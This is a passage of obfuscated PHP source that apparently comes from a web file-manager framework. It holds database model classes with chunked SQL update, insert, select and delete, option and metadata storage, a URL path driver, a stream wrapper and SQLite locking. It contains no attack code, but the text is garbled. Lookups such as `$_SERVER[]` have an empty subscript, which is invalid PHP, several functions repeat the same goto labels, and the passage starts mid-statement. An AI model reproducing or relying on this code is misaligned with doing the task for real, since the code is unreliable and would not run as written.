$A״ߟ = array(); } if ($AԶ˾ == 1) { $bך = count($A״ߟ); } $aȉ = array($a[364] => array($a[365] => $bך, $a[361] => $b㟃, $a[351] => $Cǐ, $a[366] => $AԶ˾), $a[367] => $A״ߟ); goto E·; F: } protected function checkLength($f叡̪, $B = 0, $Cކ = '') { $C =& $_SERVER[]; $B = $B ? $B : 65536; if (!$f叡̪ || strlen($f叡̪) < $B) { return; } $Cކ = $Cކ ? $Cކ . $C[68] : $C[33]; show_json($Cކ . LNG($C[368]) . "\x28{$B}\51", !1); } protected function metaSet($eي, $Fڟ = null, $eŵ = null) { goto Bǚλ; Bǚλ: $cӒ =& $_SERVER[]; if (!$this->tableMeta || !$eي) { return !1; } $a㼛 = $this->tableMeta[$cӒ[369]]; goto fΈʊ; A: if (is_null($Fڟ)) { return $D˯«->where(array($a㼛 => $eي))->delete(); } if (is_null($eŵ) && is_string($Fڟ)) { return $D˯«->where($Aؤ)->delete(); } $f = is_array($Fڟ) ? $Fڟ : array(); goto a; E: $aΟ = $cӒ[373] . $this->tableMeta; CacheLock::lock($aΟ); $D˯«->where(array($a㼛 => $eي))->addAll($BǗ, array(), !0); goto b瘬; fΈʊ: $A򮃞 = $this->tableMeta[$cӒ[370]]; $D˯« = Model($A򮃞); $Aؤ = array($a㼛 => $eي, $cӒ[371] => $Fڟ); goto A; a: if (is_string($Fڟ)) { $f[$Fڟ] = $eŵ; } $BǗ = array(); foreach ($f as $bα䱦 => $E׏) { $this->checkLength($E׏, !1, $A򮃞 . $cӒ[4] . $bα䱦); $BǗ[] = array($a㼛 => $eي, $cӒ[93] => $bα䱦, $cӒ[372] => $E׏); } goto E; b瘬: CacheLock::unlock($aΟ); return !0; goto E; E: } public function metaGet($e춢Κ, $Bݡ = false) { goto f; a˯: $FўǓ = Model($this->tableMeta[$FȮ[370]]); if ($Bݡ) { $cƜ = array($b䥉 => $e춢Κ, $FȮ[93] => $Bݡ); return $FўǓ->where($cƜ)->getField($FȮ[372]); } $cƜ = array($b䥉 => $e춢Κ); goto b˺𺫧; b˺𺫧: $eΏ = $FўǓ->field($FȮ[374])->where($cƜ)->select(); $eΏ = array_to_keyvalue($eΏ, $FȮ[93], $FȮ[372]); return $eΏ; goto fØﾤ; f: $FȮ =& $_SERVER[]; if (!$this->tableMeta) { return array(); } $b䥉 = $this->tableMeta[$FȮ[369]]; goto a˯; fØﾤ: } private function checkDataAutoHas($e) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Ȃ) { if (in_array($e, explode($_SERVER[][47], $Ȃ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$eνբ, $A񠉷) { $bӚǮ =& $_SERVER[]; foreach ($this->dataAuto as $E珞) { $c = $E珞[0]; if (!in_array($A񠉷, explode($bӚǮ[47], $E珞[2]))) { continue; } switch (trim($E珞[3])) { case $bӚǮ[319]: case $bӚǮ[320]: $Aԅ = $E珞[1]; $bÚΏ = isset($E珞[4]) ? (array) $E珞[4] : array(); if ($Aԅ == $bӚǮ[197] && array_key_exists($c, $eνբ)) { if (!$eνբ[$c]) { unset($eνբ[$c]); } break; } if (isset($eνբ[$c])) { array_unshift($bÚΏ, $eνբ[$c]); } if ($bӚǮ[319] == $E珞[3]) { $eνբ[$c] = call_user_func_array($Aԅ, $bÚΏ); } else { $eνբ[$c] = call_user_func_array(array(&$this, $Aԅ), $bÚΏ); } break; case $bӚǮ[271]: $eνբ[$c] = $eνբ[$E珞[1]]; break; case $bӚǮ[292]: if (isset($eνբ[$c]) && !is_string($eνբ[$c])) { $eνբ[$c] = json_encode_force($eνբ[$c]); } break; case $bӚǮ[321]: if ($eνբ[$c] === $bӚǮ[33]) { unset($eνբ[$c]); } break; case $bӚǮ[322]: $eνբ[$c] = $E珞[1]; default: break; } } if ($A񠉷 == $bӚǮ[355]) { $d΢ = strtolower($this->db->getDbType()); if (strpos($d΢, $bӚǮ[9]) !== 0) { return; } $D = $this->field(!0)->fields; $f = $D[$bӚǮ[250]]; if (isset($D[$bӚǮ[249]])) { unset($f[$D[$bӚǮ[249]]]); } foreach ($f as $c => $A񠉷) { if (!isset($eνբ[$c])) { $eνբ[$c] = $bӚǮ[33]; } } } } private function dataAfterFilter(&$B䯏ޅ) { $E⚪ =& $_SERVER[]; foreach ($this->dataAuto as $fՎ) { $c = $fՎ[0]; if (!in_array($E⚪[357], explode($E⚪[47], $fՎ[2]))) { continue; } if (!isset($B䯏ޅ[$c])) { continue; } switch (trim($fՎ[3])) { case $E⚪[319]: case $E⚪[320]: $c = isset($fՎ[4]) ? (array) $fՎ[4] : array(); array_unshift($c, $B䯏ޅ[$c]); if ($E⚪[319] == $fՎ[3]) { $B䯏ޅ[$c] = call_user_func_array($fՎ[1], $c); } else { $B䯏ޅ[$c] = call_user_func_array(array(&$this, $fՎ[1]), $c); } break; case $E⚪[271]: $B䯏ޅ[$c] = $B䯏ޅ[$fՎ[1]]; break; case $E⚪[292]: $Eɂϲ = $B䯏ޅ[$c]; $B䯏ޅ[$c] = json_decode($Eɂϲ, !0); if (is_null($B䯏ޅ[$c])) { $B䯏ޅ[$c] = $Eɂϲ; } break; case $E⚪[321]: if ($B䯏ޅ[$c] === $E⚪[33]) { unset($B䯏ޅ[$c]); } break; case $E⚪[322]: $B䯏ޅ[$c] = $fՎ[1]; default: break; } } } public function saveAll($F) { goto A; fƹ: $D = array(); $A۸ƙ = count($F); for ($F® = 0; $F® < $A۸ƙ; $F®++) { $BԄ = $F[$F®]; if (!is_array($BԄ) || count($BԄ) != 4) { continue; } $Fƣ± = "\125\x50\104\101\x54\x45\x20\140{$b}\140\x20\x53\105\x54\40{$BԄ[2]}\40\75\40\x43\101\123\105\x20{$BԄ[0]}\40\xa"; if ($e == 0) { $dњ̇ = $Fƣ±; } $D[] = $d꫏[116] . $BԄ[1] . $d꫏[116]; $e++; $dњ̇ .= "\40\127\110\x45\x4e\x20\x27{$BԄ[1]}\47\40\124\110\x45\x4e\x20\47{$BԄ[3]}\x27\x20\xa"; if ($e == $A || $F® == $A۸ƙ - 1) { goto aס; FȪ: $e = 0; $dњ̇ = $Fƣ±; $this->chunkEventCheck(count($D)); goto fע; aס: $b凒ʤ = implode($d꫏[47], $D); $dњ̇ .= "\x20\105\116\x44\x20\x20\x57\x48\105\x52\x45\x20{$BԄ[0]}\40\111\116\40\50{$b凒ʤ}\51\x20"; $this->execute($dњ̇); goto FȪ; fע: $D = array(); goto DԨ׶; DԨ׶: } } goto aقʈ; aقʈ: $this->chunkEventSet(); goto Cݎ; a: $F = is_array($F) ? $F : array(); $dњ̇ = $d꫏[375]; $e = 0; goto fƹ; A: $d꫏ =& $_SERVER[]; $b = $this->tablePrefix . $this->tableName; $A = self::SQL_WHERE_IN_CHUNK; goto a; Cݎ: } public function saveAllEach($b) { $Eʼ =& $_SERVER[]; $dǣ = $this->tablePrefix . $this->tableName; foreach ($b as $AȤщ) { if (!is_array($AȤщ) || count($AȤщ) != 4) { continue; } $e = $AȤщ[0] . $Eʼ[376] . $AȤщ[1] . $Eʼ[116]; $AÑ񑤢 = $AȤщ[2] . $Eʼ[376] . $AȤщ[3] . $Eʼ[116]; $d䙶 = "\x75\x70\144\141\164\x65\x20{$dǣ}\40\x73\145\x74\40{$AÑ񑤢}\40\x77\150\145\x72\145\x20{$e}\x3b"; $this->execute($d䙶); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($d = false, $Dʹ = false) { $this->_chunkEvent = $d; $this->_chunkEventParam = $Dʹ; } private function chunkEventCheck($C𐼷) { if (!$this->_chunkEvent) { return; } $CˆҘ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $CˆҘ[$_SERVER[][377]] = $C𐼷; Hook::trigger($this->_chunkEvent, $CˆҘ); } public function addAll($B, $fܺ = array(), $DÞ = false) { goto Aˠ; c⸦咋: if (method_exists($this->db, $Dޒ[270])) { for ($aԶ = 0; $aԶ < count($B); $aԶ += $Fͤ) { $B쎴ݛ = array_slice($B, $aԶ, $Fͤ); if (!is_array($B쎴ݛ) || count($B쎴ݛ) == 0) { break; } $fǫ = $this->db->insertAll($B쎴ݛ, $fܺ, $DÞ); $this->chunkEventCheck(count($B쎴ݛ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($B as $E̪ => $e) { $fǫ = $this->db->insert($e, $fܺ, $DÞ); } $this->commit(); } if (!1 !== $fǫ) { $A蘤ϑ = $this->getLastInsID(); if ($A蘤ϑ) { return $A蘤ϑ; } } return $fǫ; goto bǢϖ; F݇ш: if (empty($B)) { $this->error = think_lang($Dޒ[269]); return !1; } $fܺ = $this->_parseOptions($fܺ); foreach ($B as $E̪ => $e) { $B[$E̪] = $this->_facade($e); $this->_beforeInsert($B[$E̪], $fܺ); } goto c⸦咋; Aˠ: $Dޒ =& $_SERVER[]; ignore_timeout(); $Fͤ = self::SQL_WHERE_IN_CHUNK; goto F݇ш; bǢϖ: } public function save($Eѓ鬙 = '', $aŐ = array()) { goto BձΪ; Fʖܹ: $fΟ = $Cу[$Dۻڔ[273]][$eΪ][1]; $fΟ = is_array($fΟ) ? $fΟ : array(); $d = count($fΟ); goto b; BձΪ: $Dۻڔ =& $_SERVER[]; $a = self::SQL_WHERE_IN_CHUNK; $Cу = $this->optionsValue(); goto fⲧ; fⲧ: $eΪ = $this->findWhereField($Cу); if (!$eΪ) { return parent::save($Eѓ鬙, $aŐ); } $c = 0; goto Fʖܹ; b: for ($eʜ = 0; $eʜ < $d; $eʜ += $a) { $A = array_slice($fΟ, $eʜ, $a); if (!is_array($A) || count($A) == 0) { break; } $Cу[$Dۻڔ[273]][$eΪ][1] = $A; $this->optionsValue($Cу); $c += parent::save($Eѓ鬙, $aŐ); $this->chunkEventCheck(count($A)); } $this->chunkEventSet(); return $c; goto fٗ; fٗ: } public function add($c֦ = '', $f = array(), $bߧ = false) { if ($this->addTaskStatus && is_array($c֦)) { $this->addTaskData[] = $c֦; return; } return parent::add($c֦, $f, $bߧ); } public function parseWhereLike($eʋ, $e눼 = '', $aچƊ = false, &$B = false) { goto bЅ; c̔: if (!is_array($eʋ)) { return $eʋ; } $e׾ = array(); $cཆ = 0; goto Eë; bЅ: $e =& $_SERVER[]; $dﰷ = $GLOBALS[$e[6]][$e[378]]; if (!$dﰷ[$e[379]]) { return $eʋ; } goto c̔; Eë: foreach ($eʋ as $dۤ => $D郎ݏ) { if (is_array($D郎ݏ) && count($D郎ݏ) == 2 && $D郎ݏ[0] == $e[380] && is_string($D郎ݏ[1]) && substr($D郎ݏ[1], 0, 1) == $e[381] && substr($D郎ݏ[1], strlen($D郎ݏ[1]) - 1, 1) == $e[381]) { goto e; e: if ($dﰷ[$e[383]]) { $A = $e[384] . $B᱐ . $e[385]; if ($dﰷ[$e[386]]) { $A = $e[385] . $B᱐ . $e[384]; } } $e׾[$cཆ] = $e[387] . $A . $e[388] . $A . $e[389]; $cཆ++; goto a; e: $B = !0; $A = is_string($dۤ) ? $dۤ : $e눼; $B᱐ = substr($D郎ݏ[1], 1, strlen($D郎ݏ[1]) - 2); goto dɟЫ; dɟЫ: $B᱐ = $this->db->escapeString($B᱐); if (!strpos($A, $e[95])) { $A = $e[382] . $A . $e[382]; } $A = $e[182] . $B᱐ . $e[182]; goto e; a: continue; goto EϨѷ; EϨѷ: } if (is_array($D郎ݏ)) { $e눼 = is_string($dۤ) ? $dۤ : $e눼; $D郎ݏ = $this->parseWhereLike($D郎ݏ, $e눼, !0, $B); } if (is_numeric($dۤ)) { $e׾[$cཆ] = $D郎ݏ; $cཆ++; } else { $e׾[$dۤ] = $D郎ݏ; } } if ($B && !$aچƊ) { } return $e׾; goto A왉; A왉: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($F = array()) { goto D; A٨ɪ: return $cܐ; goto AȄ; f: $b = $this->findWhereField($B); if (!$b || isset($B[$c㢂[290]]) || isset($B[$c㢂[351]])) { return parent::select($F); } $B = $B[$c㢂[273]][$b][1]; goto D; D: $B = is_array($B) ? $B : array(); $cܐ = null; for ($f = 0; $f < count($B); $f += $bΊ펭) { $bͼ = array_slice($B, $f, $bΊ펭); if (!is_array($bͼ) || count($bͼ) == 0) { break; } $B[$c㢂[273]][$b][1] = $bͼ; $this->optionsValue($B); $f = parent::select($F); if (!$f) { continue; } $cܐ = is_array($cܐ) ? $cܐ : array(); $cܐ = array_merge($cܐ, $f); } goto A٨ɪ; D: $c㢂 =& $_SERVER[]; $bΊ펭 = self::SQL_WHERE_IN_CHUNK; $B = $this->optionsValue(); goto f; AȄ: } public function delete($C = array()) { goto d; d: $D䉃 =& $_SERVER[]; $fܣˠ = self::SQL_WHERE_IN_CHUNK; $c = $this->optionsValue(); goto C˾; C˾: $e鿝 = $this->findWhereField($c); if (!$e鿝) { return parent::delete($C); } $f = 0; goto dî; dî: $E = $c[$D䉃[273]][$e鿝][1]; $E = is_array($E) ? $E : array(); for ($C = 0; $C < count($E); $C += $fܣˠ) { $a = array_slice($E, $C, $fܣˠ); if (!is_array($a) || count($a) == 0) { break; } $c[$D䉃[273]][$e鿝][1] = $a; $this->optionsValue($c); $f += parent::delete($C); } goto bͣ鈃; bͣ鈃: return $f; goto dӈ; dӈ: } private function findWhereField($bѩ) { $Eƹ =& $_SERVER[]; $c䃻 = self::SQL_WHERE_IN_CHUNK; if (!is_array($bѩ) || !is_array($bѩ[$Eƹ[273]])) { return !1; } foreach ($bѩ[$Eƹ[273]] as $Cǖ => $CɊ) { if (is_array($CɊ) && isset($CɊ[0]) && is_string($CɊ[0]) && strtolower($CɊ[0]) == $Eƹ[7] && is_array($CɊ[1]) && count($CɊ[1]) > $c䃻) { ignore_timeout(); return $Cǖ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\164\x65\155\x4f\160\x74\151\x6f\x6e"; public $field = array(); public function listData($eᄙ = false, $F؄ = "\x6d\x6f\144\151\146\x79\124\x69\x6d\x65", $Fſ = false) { $fБ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$fБ) { return $eᄙ ? null : array(); } if (!$eᄙ) { $fБ = array_filter(array_values($fБ)); return array_sort_by($fБ, $F؄, $Fſ); } return $fБ[$_SERVER[][390] . $eᄙ]; } public function insert($d̚) { goto CɅӆ; CɅӆ: $d̸ᷲ =& $_SERVER[]; $d̚ = array_field_key($d̚, $this->field); $d݌ = Model($this->modelType)->get($d̸ᷲ[391], $this->optionType . $d̸ᷲ[392]); goto b֚; f񉆨: $d̚[$d̸ᷲ[84]] = time(); Model($this->modelType)->set($d̸ᷲ[391], $d݌, $this->optionType . $d̸ᷲ[392]); Model($this->modelType)->set($d̸ᷲ[390] . $d݌, $d̚, $this->optionType); goto dǐƘ; dǐƘ: return $d݌; goto Fʣ; b֚: $d݌ = $d݌ ? $d݌ : 0; $d̚[$d̸ᷲ[393]] = ++$d݌; $d̚[$d̸ᷲ[194]] = time(); goto f񉆨; Fʣ: } public function update($dᭆ, $eƆڟ) { goto A; D̥٠: return Model($this->modelType)->set($E[390] . $dᭆ, $eƆڟ, $this->optionType); goto fҽ; A: $E =& $_SERVER[]; $eƆڟ = array_field_key($eƆڟ, $this->field); $FÃ = $this->listData($dᭆ); goto c͗կ; c͗կ: if (!$FÃ) { return !1; } $eƆڟ = array_merge($FÃ, $eƆڟ); $eƆڟ[$E[84]] = time(); goto D̥٠; fҽ: } public function remove($F) { return Model($this->modelType)->remove($_SERVER[][390] . $F, $this->optionType); } public function clear() { $BС =& $_SERVER[]; Model($this->modelType)->remove($BС[391], $this->optionType . $BС[392]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($d󅂨, $C׃) { if (!$C׃) { return !1; } $E÷ = $this->listData(); $E÷ = array_to_keyvalue($E÷, $d󅂨); return isset($E÷[$C׃]) ? $E÷[$C׃] : !1; } public function findByName($b) { return $this->findByKey($_SERVER[][28], $b); } protected function resetData($A) { $D۔ =& $_SERVER[]; $A = is_array($A) ? $A : array(); $fʕ = array(); for ($aЉ = 0; $aЉ < count($A); $aЉ++) { $fʕ[$D۔[390] . $A[$aЉ][$D۔[393]]] = $A[$aЉ]; } return Model($this->modelType)->set($fʕ, !1, $this->optionType); } private function getAutoName($E) { $c = array_to_keyvalue($this->listData(), $_SERVER[][28]); if (!$c || !isset($c[$E])) { return $E; } for ($FП = 1; $FП < count($c); $FП++) { $dШ = $E . "\x28{$FП}\51"; if (!isset($c[$dШ])) { return $dШ; } } return $dШ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($c = false, $D = '', $e = false) { goto eȹ; eȹ: $C =& $_SERVER[]; $b = $this->cacheGet($D); $dݭÕ = $this->optionDefault($D); goto dᔋ; D: $b = $this->where($bԲ㠽)->select(); $b = array_to_keyvalue($b, $C[93], $C[372]); foreach ($b as $b䎍 => $B󘪐) { if ($e || in_array($b䎍, $this->jsonField)) { $b[$b䎍] = json_decode($B󘪐, !0); } } goto fҌ; dᔋ: $dݭÕ = is_array($dݭÕ) ? $dݭÕ : array(); if (is_array($b)) { $b = array_merge($dݭÕ, $b); return $c ? isset($b[$c]) ? $b[$c] : null : $b; } $bԲ㠽 = $this->filterWhere(array($C[29] => $D)); goto D; fҌ: $this->cacheSet($D, $b); $b = array_merge($dݭÕ, $b); return $c ? $b[$c] : $b; goto cڒ; cڒ: } public function set($e݇, $d = false, $d蘂 = '') { goto c; Fˬ: $aꅲ = is_array($e݇) ? $e݇ : array($e݇ => $d); foreach ($aꅲ as $D => $E) { if (is_array($E)) { $E = json_encode_force($E); } $this->checkLength($E, !1, $this->tableName . $eଯ[4] . $e݇); $E = self::textEncode($E); $aꅲ = array($eଯ[29] => $d蘂, $eଯ[93] => $D, $eଯ[372] => $E); $CȂ[] = $this->filterWhere($aꅲ); } if (!$CȂ) { return !0; } goto C; c: $eଯ =& $_SERVER[]; $this->cacheRemove($d蘂); $CȂ = array(); goto Fˬ; C: return $this->addAll($CȂ, array(), !0); goto Bқ; Bқ: } protected function optionDefault($eשɋ = '') { return !1; } public function setDeep($DȠ, $fֶ = false, $eָƋ = '') { $A = explode($_SERVER[][95], $DȠ); $FԈ = $this->get(); array_set_value($FԈ, $DȠ, $fֶ); $this->set($A[0], $FԈ[$A[0]], $eָƋ); } public function remove($Cʾ΂, $F = '') { $E =& $_SERVER[]; $this->cacheRemove($F); $C󼤽 = $this->filterWhere(array($E[93] => $Cʾ΂, $E[29] => $F)); if (is_null($Cʾ΂)) { unset($C󼤽[$E[93]]); } return $this->where($C󼤽)->delete(); } public function cacheSet($Aˉ, $Eڿ = false) { return Cache::set($this->cacheKey($Aˉ), $Eڿ); } public function cacheGet($Fڃ) { return Cache::get($this->cacheKey($Fڃ)); } public function cacheRemove($d) { return Cache::remove($this->cacheKey($d)); } protected function filterWhere($f) { return $f; } protected function cacheKey($Aӗ) { return $Aӗ; } } goto Bݾ; eơʄ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($E = false) { } public function exist($fݜ⶟) { $DÌ = $this->info($fݜ⶟); return $DÌ[$_SERVER[][195]]; } public function isFile($e) { $bϔ = $this->info($e); return $bϔ[$_SERVER[][195]]; } public function isFolder($D) { return !1; } public function size($Cญ) { $Cڝ = $this->info($Cญ); return $Cڝ[$_SERVER[][78]]; } public function info($AƯЧ) { return $this->infoParse($AƯЧ); } public function infoAuth($d軥) { return $this->infoParse($d軥); } public function infoWithChildren($AϏ) { return $this->infoParse($AϏ); } public function infoFull($e匈) { return $this->infoParse($e匈); } private function infoParse($dԆ) { $aޒ =& $_SERVER[]; $DƎĨ = $this->header($dԆ); if (!$DƎĨ || !$DƎĨ[$aޒ[716]]) { return !1; } $eۃ֙ = _get($DƎĨ, $aޒ[335], 0); $a߿⦜ = array($aޒ[28] => $DƎĨ[$aޒ[28]], $aޒ[76] => $dԆ, $aޒ[29] => $aޒ[193], $aޒ[78] => intval($eۃ֙), $aޒ[168] => get_path_ext($DƎĨ[$aޒ[28]]), $aޒ[1263] => $eۃ֙ > 0 && $DƎĨ[$aޒ[1384]], $aޒ[1264] => !1); return $a߿⦜; } private function header($Bǅ) { goto c; bު: $GLOBALS[$eև[1385]] = !0; self::$_cacheHeader[$Bǅ] = url_header($Bǅ); $GLOBALS[$eև[1385]] = $f륅䅨; goto e̐; e̐: return self::$_cacheHeader[$Bǅ]; goto BԚ; c: $eև =& $_SERVER[]; if (isset(self::$_cacheHeader[$Bǅ])) { return self::$_cacheHeader[$Bǅ]; } $f륅䅨 = isset($GLOBALS[$eև[1385]]) ? $GLOBALS[$eև[1385]] : !1; goto bު; BԚ: } public function hashSimple($dܗ, $d儹 = false) { goto d; d: $bڇ =& $_SERVER[]; $C = $this->info($dܗ); if (!$C || !$C[$bڇ[195]]) { return !1; } goto bկ; Cʴ: if ($Eя <= $BР * $b) { return md5($this->fileSubstr($dܗ, 0, $Eя)) . $Eя; } $dոǓ = intval($Eя / $b); $fⰌ = $bڇ[33]; goto A; bկ: $Eя = $C[$bڇ[78]]; $BР = 200; $b = 50; goto Cʴ; A: $Eڐ = timeFloat(); $C֬ԙ = 15; for ($aڇ = 0; $aڇ < $b; $aڇ++) { if (timeFloat() - $Eڐ > $C֬ԙ) { return !1; } $Eܽ = $this->fileSubstr($dܗ, $dոǓ * $aڇ, $BР); if (!$Eܽ) { return !1; } $fⰌ .= $Eܽ; } goto A; A: $fⰌ .= $this->fileSubstr($dܗ, $Eя - $BР, $BР); return md5($fⰌ) . $Eя; goto C; C: } public function getContent($Bݦ) { return $this->fileSubstr($Bݦ); } public function fileSubstr($a, $B厄 = 0, $Dۧ = -1) { goto d; B֭˘: $cĂ = url_request($a, $f[228], !1, $bȒ, !1, !1, 1); return $cĂ[$f[1095]] ? $cĂ[$f[1095]] : $f[33]; goto C; d: $f =& $_SERVER[]; $bȎ牒 = $this->info($a); if (!$bȎ牒 || !$bȎ牒[$f[195]] && $bȎ牒[$f[78]] > 1024 * 1024 * 10) { return !1; } goto B; B: if ($Dۧ === -1) { $Dۧ = $bȎ牒[$f[78]]; } if ($Dۧ == 0) { return $f[33]; } $bȒ = array($f[1386] . $B厄 . $f[750] . ($B厄 + $Dۧ - 1)); goto B֭˘; C: } public function download($A, $cȚ) { Downloader::start($A, $cȚ); return $cȚ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($C, $a = '') { goto B; B: $this->info = $this->info($C); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[][76]]; goto B; B: $this->pathOpen = $C; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto FȎޠ; FȎޠ: if (!isset(self::$_chunkBuffer[$C])) { self::$_chunkBuffer[$C] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto F; F: } function stream_read($b⹶) { $aǽ = $this->fileSubstr($this->pose, $b⹶); $this->pose += strlen($aǽ); return $aǽ; } public function stream_tell() { return $this->pose; } public function stream_seek($Cա, $fᴙ) { $Eĸ =& $_SERVER[]; if ($fᴙ == SEEK_SET) { $this->pose = $Cա; } else { if ($fᴙ == SEEK_CUR) { $this->pose += $Cա; } else { if ($fᴙ == SEEK_END) { $this->pose = $this->info[$Eĸ[78]] + intval($Cա); } } } if ($Cա < 0) { $this->pose = $this->info[$Eĸ[78]] + $Cա; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Cڻ, $D) { $D =& $_SERVER[]; $Cċ = $this->info($Cڻ); return array($D[1387] => 0, $D[1388] => 0, $D[12] => 32768 + 511, $D[1389] => 0, $D[1390] => 0, $D[1391] => 0, $D[1392] => 0, $D[78] => $Cċ[$D[78]], $D[1393] => $Cċ[$D[1262]], $D[1349] => $Cċ[$D[84]], $D[1348] => $Cċ[$D[194]], $D[1394] => 0, $D[1395] => 0); } static $fileInfo = array(); public function info($DÖ) { $Cޯȑ = $_SERVER[][1396]; if (isset(self::$fileInfo[$DÖ])) { return self::$fileInfo[$DÖ]; } if (substr($DÖ, 0, strlen($Cޯȑ)) != $Cޯȑ) { return !1; } self::$fileInfo[$DÖ] = IO::info(substr($DÖ, strlen($Cޯȑ))); return self::$fileInfo[$DÖ]; } public static function read($DЇ, $DߏІ, $E) { if (!isset(self::$_fopenCache[$DЇ])) { $CՑ춧 = new StreamWrapperIO(); $CՑ춧->stream_open($DЇ); self::$_fopenCache[$DЇ] = $CՑ춧; } $CՑ춧 = self::$_fopenCache[$DЇ]; return $CՑ춧->fileSubstr($DߏІ, $E); } public static function _read($fÝ, $Fņ됄, $b寯) { goto e; cᛍ: return $F؎; goto dډޠ; eך: $cƋ = 8192; fseek($CÌ͟, $Fņ됄, SEEK_SET); $F؎ = $bǑ[33]; goto Eś; Eś: $A왚 = 0; while ($A왚 < $b寯) { $B = min($cƋ, $b寯 - $A왚); $F؎ .= fread($CÌ͟, $B); $A왚 += $B; } fclose($CÌ͟); goto cᛍ; e: $bǑ =& $_SERVER[]; $CÌ͟ = fopen($fÝ, $bǑ[1266]); if (!$CÌ͟) { return $bǑ[33]; } goto eך; dډޠ: } public function fileSubstr($Cع, $dҎ) { goto D; D۳ʬķ: $d֘ߊ = 64 * 1024; $e =& self::$_chunkBuffer[$this->path]; if (!$e) { $e = array(); } goto eղ; D: $b =& $_SERVER[]; $C᳸ = $this->info[$b[78]]; $bӐ = $Cع; goto A; fߤ艎: $fÎ = ceil(($Cع + $dҎ) / $d֘ߊ) * $d֘ߊ - $D鉄; $Dבۑ = IO::fileSubstr($this->path, $D鉄, $fÎ); $e[$D鉄 . $b[33]] = $Dבۑ; goto aўƍ; A: $E = $dҎ; if ($Cع < 0) { $Cع = $C᳸ + $Cع; } if ($dҎ === !1) { $dҎ = $C᳸ - $Cع; } goto f׺; eղ: $bĠ = 0; $E = 0; $Dʑ = $b[33]; goto fɂ; f׺: if ($Cع + $dҎ > $C᳸) { $dҎ = $C᳸ - $Cع; } if ($dҎ <= 0) { return $b[33]; } if ($Cع < 0 || $Cع >= $C᳸ || $dҎ <= 0 || $dҎ > 1024 * 1024 * 5) { throw new Exception("\151\157\x46\x69\x6c\145\122\145\x61\x64\40\x65\162\162\157\162\x21\40\163\x74\x61\x72\164\75{$Cع}\x3b\x6c\145\156\147\x74\150\75{$dҎ}\73\x20\163\x69\172\145\x3d{$C᳸}\73"); } goto D۳ʬķ; fɂ: foreach ($e as $bĠ => $Dʑ) { $bĠ = intval($bĠ); $E = $bĠ + strlen($Dʑ); if ($Cع >= $E) { continue; } if ($Cع >= $bĠ && $Cع + $dҎ <= $E) { return substr($Dʑ, $Cع - $bĠ, $dҎ); } break; } if (count($e) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($b[1397], $b[1398] . count($e) . "\73\163\164\141\x72\164\x3d{$Cع}\54\154\145\156\x67\164\150\x3d{$dҎ}\73\x70\x6f\163\145\72{$bĠ}\x7e{$E}"); throw new Exception($b[1399]); } $D鉄 = intval($Cع / $d֘ߊ) * $d֘ߊ; goto fߤ艎; aўƍ: ksort($e); $e = substr($Dבۑ, $Cع - $D鉄, $dҎ); return $e; goto eӫ; eӫ: } private function log($A߆, $cՇ) { $aϊ妈 =& $_SERVER[]; $fŷ = timeFloat() - $this->timeStart; write_log(sprintf($aϊ妈[1400], $A߆, $this->info[$aϊ妈[28]], $fŷ, $cՇ), $aϊ妈[1085]); } } class Message { function __construct() { } public function send($B = '', $d٩˨ = array(), $fݑ = "\164\145\170\164") { goto C܋țӡ; a҂: $d٩˨ = array($Eԉ[1022] => isset($d٩˨[$Eԉ[1022]]) ? $d٩˨[$Eԉ[1022]] : $Eԉ[33], $Eԉ[562] => isset($d٩˨[$Eԉ[562]]) ? $d٩˨[$Eԉ[562]] : $Eԉ[33]); if (empty($B) || empty($d٩˨[$Eԉ[1022]]) && empty($d٩˨[$Eԉ[562]])) { return !1; } $d = array($Eԉ[1342] => $B, $Eԉ[1403] => $d٩˨); goto F; F: Hook::trigger($Eԉ[1404], $d); goto Dؠ; C܋țӡ: $Eԉ =& $_SERVER[]; $B = array($Eԉ[29] => $Eԉ[1401], $Eԉ[721] => $B); if (in_array($fݑ, array($Eԉ[1401], $Eԉ[1402]))) { $B[$Eԉ[29]] = $fݑ; } goto a҂; Dؠ: } } goto B˭ڪ; b: class DbSqlite extends DbSqliteBase { public function query($D) { $eý =& $_SERVER[]; if (!CacheLock::fileLock($eý[9])) { return !1; } $A؝ = parent::query($D); CacheLock::fileUnLock($eý[9]); return $A؝; } public function execute($Cȅ) { $d܅Ѥ =& $_SERVER[]; if (!CacheLock::fileLock($d܅Ѥ[9])) { return !1; } $aᵽ = parent::execute($Cȅ); CacheLock::fileUnLock($d܅Ѥ[9]); return $aᵽ; } } class DbSqlite3 extends DbSqlite3Base { public function query($fŨ) { $aŏס =& $_SERVER[]; if (!CacheLock::fileLock($aŏס[9])) { return !1; } $F = parent::query($fŨ); CacheLock::fileUnLock($aŏס[9]); return $F; } public function execute($A) { $Fć =& $_SERVER[]; if (!CacheLock::fileLock($Fć[9])) { return !1; } $eČ = parent::execute($A); CacheLock::fileUnLock($Fć[9]); return $eČ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\x69\x6e\153\137"; protected $pconnect 